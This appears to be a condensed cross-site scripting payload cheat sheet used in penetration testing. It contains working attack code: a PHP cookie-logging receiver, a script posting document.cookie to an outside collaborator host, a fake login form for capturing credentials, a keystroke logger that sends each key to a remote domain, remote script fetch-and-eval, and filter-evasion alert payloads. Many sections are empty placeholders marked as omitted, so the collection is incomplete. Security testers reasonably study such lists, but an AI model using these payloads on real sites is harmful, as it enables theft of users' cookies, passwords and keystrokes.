
# XSS Payloads Collection

## Cookie Theft via PHP
```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

## CORS Data Exfiltration
```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
  });
</script>
```

## UI Redressing (Fake Login Form)
```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>";
</script>
```

## JavaScript Keylogger
```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

## Debugging Payload
```html
<script>debugger;</script>
```

## Better Context Awareness Payload
```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

## Common Payloads
```html
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script>
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
```

## Img Payloads
... (Omitted for brevity, but includes all <img> payloads from source)

## SVG Payloads
... (Includes SVG payloads with `<svg>`, `<desc>`, `<foreignObject>`, `<title>`, `<script>` etc.)

## HTML5 Tag Payloads
... (Includes onload, autofocus, touch events, video/audio/meter elements)

## Remote JavaScript Load
```html
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
```

## Hidden Input Events
...

## Uppercase Output
```html
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

## DOM Based XSS
...

## JavaScript URI Wrappers
...

## Data, VBScript, XML and File Based
...

## SVG Injection via External/Fragment
...

## Markdown XSS
...

## CSS Injection
...

## postMessage Exploits
...

## Blind XSS Probes
...

## References and Tools
- XSSHunter (Deprecated)
- sleepy-puppy, bXSS, ezXSS
